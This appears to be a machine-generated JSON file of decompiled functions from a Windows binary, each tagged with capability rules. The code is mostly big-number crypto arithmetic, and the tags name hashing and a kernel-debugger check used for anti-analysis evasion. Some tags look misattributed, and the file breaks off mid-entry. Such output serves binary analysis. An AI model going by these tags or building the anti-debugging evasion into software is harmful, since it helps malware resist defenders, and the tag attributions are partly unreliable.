{
    "00401080": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401080(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x424360;\n    (*_sym.imp.gdiplus.dll_GdipDeleteBrush)(in_ECX[1]);\n    if ((arg_8h & 1) != 0) {\n        if ((arg_8h & 4) == 0) {\n            (*_sym.imp.gdiplus.dll_GdipFree)();\n            return;\n        }\n        fcn.00401110();\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00402800": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00402800(uint *arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, ulong *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint var_64ch;\n    uint var_644h;\n    uint var_640h;\n    int32_t var_63ch;\n    int32_t var_638h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_34h = &var_4h;\n    var_4h = NULL;\n    var_3ch = 1;\n    var_38h = 1;\n    iVar1 = fcn.004020a0(arg_14h, &var_3ch);\n    if ((0 < iVar1) && (var_8h = **(arg_14h + 8),  (var_8h & 1) != 0)) {\n        var_34h = &var_4h;\n        var_4h = NULL;\n        var_3ch = 1;\n        var_38h = 1;\n        iVar1 = fcn.004020a0(arg_10h, &var_3ch);\n        if (-1 < iVar1) {\n            uVar4 = 0x20;\n            uVar5 = (var_8h * 2 + 4U & 8) + var_8h;\n            do {\n                uVar4 = uVar4 >> 1;\n                uVar5 = uVar5 * (2 - uVar5 * var_8h);\n            } while (7 < uVar4);\n            _var_30h = 1;\n            iVar1 = ~uVar5 + 1;\n            var_28h = 0;\n            var_24h = 1;\n            var_20h = 0;\n            var_1ch = 0;\n            var_48h = 1;\n            var_44h = 0;\n            var_40h = 0;\n            fcn.0040cc00(&var_64ch, 0, 0x600);\n            uVar4 = fcn.00401f60(arg_10h);\n            if (uVar4 < 0x2a0) {\n                if (uVar4 < 0xf0) {\n                    if (uVar4 < 0x50) {\n                        var_ch = (-(0x17 < uVar4) & 2) + 1;\n                    }\n                    else {\n                        var_ch = 0x4;\n                    }\n                }\n                else {\n                    var_ch = 0x5;\n                }\n            }\n            else {\n                var_ch = 0x6;\n            }\n            var_8h = *(arg_14h + 4) + 1;\n            puVar2 = fcn.00403690(arg_8h, var_8h);\n            if (((puVar2 == NULL) && (puVar2 = fcn.00403690(&var_640h, var_8h),  puVar2 == NULL)) &&\n               (puVar2 = fcn.00403690(&var_24h, var_8h * 2),  puVar2 == NULL)) {\n                var_4ch = *arg_ch;\n                if (var_4ch == -1) {\n                    puVar2 = fcn.00402180(&var_48h, arg_ch);\n                    if (puVar2 != NULL) goto code_r0x00402ddd;\n                    arg_ch = &var_48h;\n                    var_48h = 1;\n                }\n                if ((arg_18h == NULL) || (*(arg_18h + 1) == 0)) {\n                    puVar2 = fcn.00403e10(&var_30h, 1);\n                    if ((puVar2 != NULL) ||\n                       ((puVar2 = fcn.00404410(&var_30h, *(arg_14h + 4) << 6),  puVar2 != NULL ||\n                        (puVar2 = fcn.00403f50(&var_30h, &var_30h, arg_14h),  puVar2 != NULL)))) goto code_r0x00402ddd;\n                    if (arg_18h != NULL) {\n                        *arg_18h = _var_30h;\n                        *(arg_18h + 1) = var_28h;\n                    }\n                }\n                else {\n                    _var_30h = *arg_18h;\n                    var_28h = *(arg_18h + 1);\n                }\n                iVar3 = fcn.004020a0(arg_ch, arg_14h);\n                if (iVar3 < 0) {\n                    puVar2 = fcn.00402180(&var_640h, arg_ch);\n                }\n                else {\n                    puVar2 = fcn.00403f50(&var_640h, arg_ch, arg_14h);\n                }\n                if ((((puVar2 == NULL) &&\n                     (puVar2 = fcn.00404e90(&var_640h, &var_30h, arg_14h, iVar1, &var_24h),  puVar2 == NULL)) &&\n                    (puVar2 = fcn.00402180(arg_8h, &var_30h),  puVar2 == NULL)) &&\n                   (puVar2 = fcn.00404fb0(arg_8h, arg_14h, iVar1, &var_24h),  puVar2 == NULL)) {\n                    if (0x1 < var_ch) {\n                        var_14h = var_ch - 1;\n                        var_4h = 1 << (var_14h & 0x1f);\n                        var_8h = &var_64ch + var_4h * 3;\n                        puVar2 = fcn.00403690(var_8h, *(arg_14h + 4) + 1);\n                        if ((puVar2 != NULL) || (puVar2 = fcn.00402180(var_8h, &var_640h),  puVar2 != NULL))\n                        goto code_r0x00402ddd;\n                        var_18h = puVar2;\n                        if (var_14h != NULL) {\n                            do {\n                                puVar2 = fcn.00404e90(var_8h, var_8h, arg_14h, iVar1, &var_24h);\n                                if (puVar2 != NULL) goto code_r0x00402ddd;\n                                var_18h = var_18h + 1;\n                            } while (var_18h < var_14h);\n                        }\n                        var_8h = var_4h + 1;\n                        var_4h = 1 << (var_ch & 0x1f);\n                        if (var_8h < var_4h) {\n                            var_10h = &var_64ch + var_8h * 3;\n                            do {\n                                puVar2 = fcn.00403690(var_10h, *(arg_14h + 4) + 1);\n                                if (((puVar2 != NULL) || (puVar2 = fcn.00402180(var_10h, var_10h + -3),  puVar2 != NULL)\n                                    ) || (puVar2 = fcn.00404e90(var_10h, &var_640h, arg_14h, iVar1, &var_24h), \n                                         puVar2 != NULL)) goto code_r0x00402ddd;\n                                var_8h = var_8h + 1;\n                                var_10h = var_10h + 3;\n                            } while (var_8h < var_4h);\n                        }\n                    }\n                    puVar6 = NULL;\n                    var_4h = NULL;\n                    var_18h = *(arg_10h + 4);\n                    var_8h = NULL;\n                    puVar7 = var_ch;\n                    var_14h = puVar6;\n                    var_10h = puVar6;\n                    do {\n                        do {\n                            while( true ) {\n                                if (var_4h == NULL) {\n                                    if (var_18h == NULL) {\n                                        var_4h = NULL;\n                                        if (puVar6 == NULL) goto code_r0x00402d7d;\n                                        goto code_r0x00402d20;\n                                    }\n                                    var_18h = var_18h - 1;\n                                    var_4h = 0x20;\n                                }\n                                var_4h = var_4h - 1;\n                                uVar4 = *(*(arg_10h + 8) + var_18h * 4) >> (var_4h & 0x1f) & 1;\n                                if (uVar4 == 0) break;\ncode_r0x00402c96:\n                                var_14h = puVar6 + 1;\n                                var_8h = 0x2;\n                                var_10h = var_10h | uVar4 << (puVar7 - var_14h & 0x1fU);\n                                puVar6 = var_14h;\n                                if (var_14h == puVar7) {\n                                    puVar7 = NULL;\n                                    do {\n                                        puVar2 = fcn.00404e90(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n                                        if (puVar2 != NULL) goto code_r0x00402ddd;\n                                        puVar7 = puVar7 + 1;\n                                    } while (puVar7 < var_ch);\n                                    puVar2 = fcn.00404e90(arg_8h, &var_64ch + var_10h * 3, arg_14h, iVar1, &var_24h);\n                                    if (puVar2 != NULL) goto code_r0x00402ddd;\n                                    var_8h = 0x1;\n                                    puVar7 = var_ch;\n                                    puVar6 = puVar2;\n                                    var_14h = puVar2;\n                                    var_10h = puVar2;\n                                }\n                            }\n                        } while (var_8h == NULL);\n                        if (var_8h != 0x1) goto code_r0x00402c96;\n                        puVar2 = fcn.00404e90(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n                        puVar7 = var_ch;\n                        puVar6 = var_14h;\n                    } while (puVar2 == NULL);\n                }\n            }\ncode_r0x00402ddd:\n            uVar4 = 1 << (var_ch & 0x1f);\n            uVar5 = 1 << (var_ch - 1 & 0x1f);\n            if (uVar5 < uVar4) {\n                var_4h = uVar4 - uVar5;\n                piVar8 = &var_644h + uVar5 * 3;\n                do {\n                    if (piVar8 != 0x8) {\n                        iVar1 = *piVar8;\n                        if (iVar1 != 0) {\n                            fcn.00408120(iVar1, piVar8[-1] << 2);\n                            sub.msvcrt.dll_free(iVar1);\n                        }\n                        piVar8[-2] = 1;\n                        piVar8[-1] = 0;\n                        *piVar8 = 0;\n                    }\n                    piVar8 = piVar8 + 3;\n                    var_4h = var_4h - 1;\n                } while (var_4h != NULL);\n            }\n            if (var_638h != 0) {\n                fcn.00408120(var_638h, var_63ch << 2);\n                sub.msvcrt.dll_free(var_638h);\n            }\n            iVar1 = var_1ch;\n            if (var_1ch != 0) {\n                fcn.00408120(var_1ch, var_20h << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            iVar1 = var_40h;\n            if (var_40h != 0) {\n                fcn.00408120(var_40h, var_44h << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            iVar1 = var_28h;\n            if (((arg_18h == NULL) || (*(arg_18h + 1) == 0)) && (var_28h != 0)) {\n                fcn.00408120(var_28h, var_2ch << 2);\n                sub.msvcrt.dll_free(iVar1);\n            }\n            return puVar2;\n        }\n    }\n    return 0xfffffffc;\n    while (var_4h = var_4h + 1,  var_4h < var_14h) {\ncode_r0x00402d20:\n        puVar2 = fcn.00404e90(arg_8h, arg_8h, arg_14h, iVar1, &var_24h);\n        if ((puVar2 != NULL) ||\n           ((var_10h = var_10h * 2,  (var_10h & 1 << (var_ch & 0x1f)) != 0 &&\n            (puVar2 = fcn.00404e90(arg_8h, &var_640h, arg_14h, iVar1, &var_24h),  puVar2 != NULL))))\n        goto code_r0x00402ddd;\n    }\ncode_r0x00402d7d:\n    var_34h = &var_4h;\n    var_4h = 0x1;\n    var_3ch = 1;\n    var_38h = 1;\n    puVar2 = fcn.00404e90(arg_8h, &var_3ch, arg_14h, iVar1, &var_24h);\n    if ((((puVar2 == NULL) && (var_4ch == -1)) && (*(arg_10h + 4) != 0)) && ((**(arg_10h + 8) & 1) != 0)) {\n        *arg_8h = 0xffffffff;\n        puVar2 = fcn.00401ef0(arg_8h, arg_14h, arg_8h);\n    }\n    goto code_r0x00402ddd;\n}\n",
        "token_count": 3383
    },
    "00403040": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403040(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_8h_00;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_20h = 1;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 1;\n    var_10h = 0;\n    var_ch = 0;\n    uVar2 = fcn.00402180(&var_20h, arg_ch);\n    iVar4 = 0;\n    if ((uVar2 == 0) && (uVar2 = fcn.00402180(&var_14h, arg_10h),  iVar4 = var_ch,  uVar2 == 0)) {\n        uVar2 = fcn.00403dc0(&var_20h);\n        uVar3 = fcn.00403dc0(&var_14h);\n        if (uVar2 <= uVar3) {\n            uVar3 = uVar2;\n        }\n        var_8h = uVar3;\n        uVar2 = fcn.00404550(&var_20h, uVar3);\n        iVar4 = var_ch;\n        if ((uVar2 == 0) && (uVar2 = fcn.00404550(&var_14h, uVar3),  iVar4 = var_ch,  uVar2 == 0)) {\n            var_24h = &var_4h;\n            var_14h = 1;\n            var_20h = 1;\n            var_4h = 0;\n            var_2ch = 1;\n            var_28h = 1;\n            iVar4 = fcn.004020a0(&var_20h, &var_2ch);\n            while (iVar4 != 0) {\n                iVar4 = 0;\n                uVar2 = 0;\n                if (var_1ch != 0) {\n                    do {\n                        uVar3 = 0;\n                        do {\n                            if ((*(var_18h + uVar2 * 4) >> (uVar3 & 0x1f) & 1) != 0) goto code_r0x0040315e;\n                            uVar3 = uVar3 + 1;\n                            iVar4 = iVar4 + 1;\n                        } while (uVar3 < 0x20);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_1ch);\n                }\n                iVar4 = 0;\ncode_r0x0040315e:\n                uVar2 = fcn.00404550(&var_20h, iVar4);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040326a;\n                iVar4 = 0;\n                if (var_10h != 0) {\n                    do {\n                        uVar3 = 0;\n                        do {\n                            if ((*(var_ch + uVar2 * 4) >> (uVar3 & 0x1f) & 1) != 0) goto code_r0x0040319e;\n                            uVar3 = uVar3 + 1;\n                            iVar4 = iVar4 + 1;\n                        } while (uVar3 < 0x20);\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_10h);\n                }\n                iVar4 = 0;\ncode_r0x0040319e:\n                uVar2 = fcn.00404550(&var_14h, iVar4);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040326a;\n                iVar4 = fcn.004020a0(&var_20h, &var_14h);\n                if (iVar4 < 0) {\n                    uVar2 = fcn.00404660(&var_14h, &var_14h, &var_20h);\n                    iVar4 = var_ch;\n                    if (uVar2 != 0) goto code_r0x0040326a;\n                    arg_8h_00 = &var_14h;\n                }\n                else {\n                    uVar2 = fcn.00404660(&var_20h, &var_20h, &var_14h);\n                    iVar4 = var_ch;\n                    if (uVar2 != 0) goto code_r0x0040326a;\n                    arg_8h_00 = &var_20h;\n                }\n                uVar2 = fcn.00404550(arg_8h_00, 1);\n                iVar4 = var_ch;\n                if (uVar2 != 0) goto code_r0x0040326a;\n                var_24h = &var_4h;\n                var_2ch = 1;\n                var_28h = 1;\n                iVar4 = fcn.004020a0(&var_20h, &var_2ch);\n                uVar3 = var_8h;\n            }\n            uVar2 = fcn.00404410(&var_14h, uVar3);\n            iVar4 = var_ch;\n            if (uVar2 == 0) {\n                uVar2 = fcn.00402180(arg_8h, &var_14h);\n                iVar4 = var_ch;\n            }\n        }\n    }\ncode_r0x0040326a:\n    iVar1 = var_18h;\n    if (var_18h != 0) {\n        fcn.00408120(var_18h, var_1ch << 2);\n        sub.msvcrt.dll_free(iVar1);\n    }\n    if (iVar4 != 0) {\n        fcn.00408120(iVar4, var_10h << 2);\n        sub.msvcrt.dll_free(iVar4);\n    }\n    return uVar2;\n}\n",
        "token_count": 1412
    },
    "004032b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004032b0(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (0x1ffd < arg_ch - 3) {\n        return -4;\n    }\n    var_18h = 1;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = ((arg_ch & 0x1f) != 0) + (arg_ch >> 5);\n    if ((arg_10h & 2) == 0) {\n        if (arg_ch < 0x514) {\n            if (arg_ch < 0x352) {\n                if (arg_ch < 0x28a) {\n                    if (arg_ch < 0x15e) {\n                        if (arg_ch < 0xfa) {\n                            iVar3 = (-(arg_ch < 0x96) & 9) + 0x12;\n                        }\n                        else {\n                            iVar3 = 0xc;\n                        }\n                    }\n                    else {\n                        iVar3 = 8;\n                    }\n                }\n                else {\n                    iVar3 = 4;\n                }\n            }\n            else {\n                iVar3 = 3;\n            }\n        }\n        else {\n            iVar3 = 2;\n        }\n    }\n    else if (arg_ch < 0x5aa) {\n        if (arg_ch < 0x47e) {\n            if (arg_ch < 1000) {\n                if (arg_ch < 0x352) {\n                    if (arg_ch < 0x2ee) {\n                        if (arg_ch < 500) {\n                            if (arg_ch < 0xfa) {\n                                iVar3 = (-(arg_ch < 0x96) & 0xb) + 0x28;\n                            }\n                            else {\n                                iVar3 = 0x1c;\n                            }\n                        }\n                        else {\n                            iVar3 = 0xd;\n                        }\n                    }\n                    else {\n                        iVar3 = 8;\n                    }\n                }\n                else {\n                    iVar3 = 7;\n                }\n            }\n            else {\n                iVar3 = 6;\n            }\n        }\n        else {\n            iVar3 = 5;\n        }\n    }\n    else {\n        iVar3 = 4;\n    }\n    var_8h = var_ch * 4;\n    var_4h = iVar3;\n    iVar2 = fcn.00402ef0(arg_8h, var_8h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        return iVar2;\n    }\ncode_r0x00403410:\n    if (0xb504f333 < *(arg_8h[2] + -4 + var_8h)) {\n        if ((arg_ch < var_ch * 0x20) && (iVar2 = fcn.00404550(arg_8h, var_ch * 0x20 - arg_ch),  iVar2 != 0)) {\n            return iVar2;\n        }\n        *arg_8h[2] = *arg_8h[2] | 1;\n        if ((arg_10h & 1) != 0) {\n            uVar5 = 0;\n            *arg_8h[2] = *arg_8h[2] | 2;\n            arg_ch = arg_8h[1];\n            if (arg_ch != 0) {\n                puVar4 = arg_8h[2] + (arg_ch + -1) * 4;\n                iVar2 = arg_ch;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + -1;\n                    uVar5 = (((uVar5 << 0x10 | uVar1 >> 0x10) % 3) * 0x10000 | uVar1 & 0xffff) % 3;\n                    iVar2 = iVar2 + -1;\n                    iVar3 = var_4h;\n                } while (iVar2 != 0);\n            }\n            if (*arg_8h < 0) {\n                if (uVar5 != 0) {\n                    uVar5 = 3 - uVar5;\n                    goto code_r0x004034f7;\n                }\ncode_r0x004034fb:\n                arg_ch = 8;\ncode_r0x00403510:\n                var_1ch = &arg_ch;\n                var_24h = 1;\n                var_20h = 1;\n                iVar2 = fcn.00401ef0(arg_8h, arg_8h, &var_24h);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            else {\ncode_r0x004034f7:\n                if (uVar5 == 0) goto code_r0x004034fb;\n                if (uVar5 == 1) {\n                    arg_ch = 4;\n                    goto code_r0x00403510;\n                }\n            }\n            iVar2 = fcn.00402180(&var_18h, arg_8h);\n            if (iVar2 == 0) {\n                iVar2 = fcn.00404550(&var_18h, 1);\n                while (((iVar2 == 0 &&\n                        ((((iVar2 = fcn.00404960(arg_8h),  iVar2 != 0 || (iVar2 = fcn.00404960(&var_18h),  iVar2 != 0))\n                          || (iVar2 = fcn.00404a00(arg_8h, iVar3, arg_14h, arg_18h),  iVar2 != 0)) ||\n                         (iVar2 = fcn.00404a00(&var_18h, iVar3, arg_14h, arg_18h),  iVar2 != 0)))) && (iVar2 == -0xe)))\n                {\n                    var_1ch = &arg_ch;\n                    arg_ch = 0xc;\n                    var_24h = 1;\n                    var_20h = 1;\n                    iVar2 = fcn.00401ef0(arg_8h, arg_8h, &var_24h);\n                    if (iVar2 != 0) break;\n                    var_28h = &arg_ch;\n                    arg_ch = 6;\n                    var_30h = 1;\n                    var_2ch = 1;\n                    iVar2 = fcn.00401ef0(&var_18h, &var_18h, &var_30h);\n                }\n            }\n            iVar3 = var_10h;\n            if (var_10h == 0) {\n                return iVar2;\n            }\n            fcn.00408120(var_10h, var_14h << 2);\n            sub.msvcrt.dll_free(iVar3);\n            return iVar2;\n        }\n        iVar2 = fcn.00403cd0(arg_8h, iVar3, arg_14h, arg_18h);\n        if (iVar2 != -0xe) {\n            return iVar2;\n        }\n    }\n    iVar2 = fcn.00402ef0(arg_8h, var_8h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    goto code_r0x00403410;\n}\n",
        "token_count": 1743
    },
    "00403660": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403660(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    if (*(arg_8h + 4) << 5 <= arg_ch) {\n        return 0;\n    }\n    return *(*(arg_8h + 8) + (arg_ch >> 5) * 4) >> (arg_ch & 0x1f) & 1;\n}\n",
        "token_count": 93
    },
    "00403720": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403720(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint *arg_8h_00;\n    uint *arg_10h_00;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint8_t *var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint8_t *var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint8_t *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint8_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint8_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    var_74h = &var_4h;\n    var_4h = 1;\n    var_7ch = 1;\n    var_78h = 1;\n    iVar4 = fcn.004020a0(arg_10h, &var_7ch);\n    if (iVar4 < 1) {\n        return -4;\n    }\n    var_58h = 1;\n    var_54h = 0;\n    var_50h = 0;\n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = NULL;\n    var_28h = 1;\n    var_24h = 0;\n    var_20h = NULL;\n    var_34h = 1;\n    var_30h = 0;\n    var_2ch = NULL;\n    var_70h = 1;\n    var_6ch = 0;\n    var_68h = 0;\n    var_64h = 1;\n    var_60h = 0;\n    var_5ch = 0;\n    var_40h = 1;\n    var_3ch = 0;\n    var_38h = NULL;\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = NULL;\n    var_4ch = 1;\n    var_48h = 0;\n    var_44h = NULL;\n    iVar4 = fcn.00403040(&var_70h, arg_ch, arg_10h);\n    if (iVar4 == 0) {\n        var_74h = &var_4h;\n        var_4h = 1;\n        var_7ch = 1;\n        var_78h = 1;\n        iVar4 = fcn.004020a0(&var_70h, &var_7ch);\n        if (iVar4 == 0) {\n            iVar4 = fcn.00403f50(&var_58h, arg_ch, arg_10h);\n            if (((((iVar4 == 0) && (iVar4 = fcn.00402180(&var_1ch, &var_58h),  iVar4 == 0)) &&\n                 (iVar4 = fcn.00402180(&var_64h, arg_10h),  iVar4 == 0)) &&\n                ((iVar4 = fcn.00402180(&var_40h, arg_10h),  iVar4 == 0 &&\n                 (iVar4 = fcn.00403e10(&var_28h, 1),  iVar4 == 0)))) &&\n               ((iVar4 = fcn.00403e10(&var_34h, 0),  iVar4 == 0 &&\n                ((iVar4 = fcn.00403e10(&var_10h, 0),  iVar4 == 0 && (iVar4 = fcn.00403e10(&var_4ch, 1),  iVar4 == 0)))))\n               ) {\n                do {\n                    uVar1 = *var_14h;\n                    while ((uVar1 & 1) == 0) {\n                        iVar4 = fcn.00404550(&var_1ch, 1);\n                        if (((iVar4 != 0) ||\n                            ((((*var_20h & 1) != 0 || ((*var_2ch & 1) != 0)) &&\n                             ((iVar4 = fcn.00401ef0(&var_28h, &var_28h, &var_64h),  iVar4 != 0 ||\n                              (iVar4 = fcn.00404770(&var_34h, &var_34h, &var_58h),  iVar4 != 0)))))) ||\n                           ((iVar4 = fcn.00404550(&var_28h, 1),  iVar4 != 0 ||\n                            (iVar4 = fcn.00404550(&var_34h, 1),  iVar4 != 0)))) goto code_r0x00403bbc;\n                        uVar1 = *var_14h;\n                    }\n                    uVar1 = *var_38h;\n                    while ((uVar1 & 1) == 0) {\n                        iVar4 = fcn.00404550(&var_40h, 1);\n                        if ((iVar4 != 0) ||\n                           (((((*var_8h & 1) != 0 || ((*var_44h & 1) != 0)) &&\n                             ((iVar4 = fcn.00401ef0(&var_10h, &var_10h, &var_64h),  iVar4 != 0 ||\n                              (iVar4 = fcn.00404770(&var_4ch, &var_4ch, &var_58h),  iVar4 != 0)))) ||\n                            ((iVar4 = fcn.00404550(&var_10h, 1),  iVar4 != 0 ||\n                             (iVar4 = fcn.00404550(&var_4ch, 1),  iVar4 != 0)))))) goto code_r0x00403bbc;\n                        uVar1 = *var_38h;\n                    }\n                    iVar4 = fcn.004020a0(&var_1ch, &var_40h);\n                    if (iVar4 < 0) {\n                        iVar4 = fcn.00404770(&var_40h, &var_40h, &var_1ch);\n                        if ((iVar4 != 0) || (iVar4 = fcn.00404770(&var_10h, &var_10h, &var_28h),  iVar4 != 0))\n                        goto code_r0x00403bbc;\n                        arg_10h_00 = &var_34h;\n                        arg_8h_00 = &var_4ch;\n                    }\n                    else {\n                        iVar4 = fcn.00404770(&var_1ch, &var_1ch, &var_40h);\n                        if ((iVar4 != 0) || (iVar4 = fcn.00404770(&var_28h, &var_28h, &var_10h),  iVar4 != 0))\n                        goto code_r0x00403bbc;\n                        arg_10h_00 = &var_4ch;\n                        arg_8h_00 = &var_34h;\n                    }\n                    iVar4 = fcn.00404770(arg_8h_00, arg_8h_00, arg_10h_00);\n                    if (iVar4 != 0) goto code_r0x00403bbc;\n                    iVar4 = fcn.00402060(&var_1ch, 0);\n                } while (iVar4 != 0);\n                iVar4 = fcn.00402060(&var_10h, 0);\n                while (iVar4 < 0) {\n                    iVar4 = fcn.00401ef0(&var_10h, &var_10h, arg_10h);\n                    if (iVar4 != 0) goto code_r0x00403bbc;\n                    iVar4 = fcn.00402060(&var_10h, 0);\n                }\n                iVar4 = fcn.004020a0(&var_10h, arg_10h);\n                while (-1 < iVar4) {\n                    iVar4 = fcn.00404770(&var_10h, &var_10h, arg_10h);\n                    if (iVar4 != 0) goto code_r0x00403bbc;\n                    iVar4 = fcn.004020a0(&var_10h, arg_10h);\n                }\n                iVar4 = fcn.00402180(arg_8h, &var_10h);\n            }\ncode_r0x00403bbc:\n            iVar2 = var_50h;\n            if (var_50h != 0) {\n                fcn.00408120(var_50h, var_54h << 2);\n                sub.msvcrt.dll_free(iVar2);\n            }\n            puVar3 = var_14h;\n            if (var_14h != NULL) {\n                fcn.00408120(var_14h, var_18h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n            puVar3 = var_20h;\n            if (var_20h != NULL) {\n                fcn.00408120(var_20h, var_24h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n            puVar3 = var_2ch;\n            if (var_2ch != NULL) {\n                fcn.00408120(var_2ch, var_30h << 2);\n                sub.msvcrt.dll_free(puVar3);\n            }\n        }\n        else {\n            iVar4 = -0xe;\n        }\n    }\n    iVar2 = var_68h;\n    if (var_68h != 0) {\n        fcn.00408120(var_68h, var_6ch << 2);\n        sub.msvcrt.dll_free(iVar2);\n    }\n    iVar2 = var_5ch;\n    if (var_5ch != 0) {\n        fcn.00408120(var_5ch, var_60h << 2);\n        sub.msvcrt.dll_free(iVar2);\n    }\n    puVar3 = var_38h;\n    if (var_38h != NULL) {\n        fcn.00408120(var_38h, var_3ch << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    puVar3 = var_8h;\n    if (var_8h != NULL) {\n        fcn.00408120(var_8h, var_ch << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    puVar3 = var_44h;\n    if (var_44h != NULL) {\n        fcn.00408120(var_44h, var_48h << 2);\n        sub.msvcrt.dll_free(puVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 2551
    },
    "00403dc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403dc0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar2 = 0;\n    uVar4 = 0;\n    if (*(arg_8h + 4) != 0) {\n        puVar3 = *(arg_8h + 8);\n        do {\n            uVar1 = 0;\n            do {\n                if ((*puVar3 >> (uVar1 & 0x1f) & 1) != 0) {\n                    return iVar2;\n                }\n                uVar1 = uVar1 + 1;\n                iVar2 = iVar2 + 1;\n            } while (uVar1 < 0x20);\n            uVar4 = uVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (uVar4 < *(arg_8h + 4));\n    }\n    return 0;\n}\n",
        "token_count": 232
    },
    "00403eb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
